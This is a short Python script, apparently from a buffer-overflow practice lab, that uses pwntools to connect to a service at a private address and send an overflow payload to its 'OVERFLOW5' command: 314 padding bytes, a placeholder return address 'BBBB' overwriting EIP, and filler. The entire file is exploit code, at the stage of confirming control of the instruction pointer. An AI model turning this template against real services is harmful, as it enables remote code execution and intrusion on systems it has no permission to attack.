#!/usr/bin/env python3

from pwn import *

host = "10.10.49.190"
port = 1337

s = remote(host, port)
total_length = 1000
offset = 314
new_eip = b"BBBB"

payload = [
    b"OVERFLOW5 ",
    b"A" * offset,
    new_eip,
    b"C" * (total_length - offset - len(new_eip)),

]

payload = b"".join(payload)
s.send(payload)
s.close()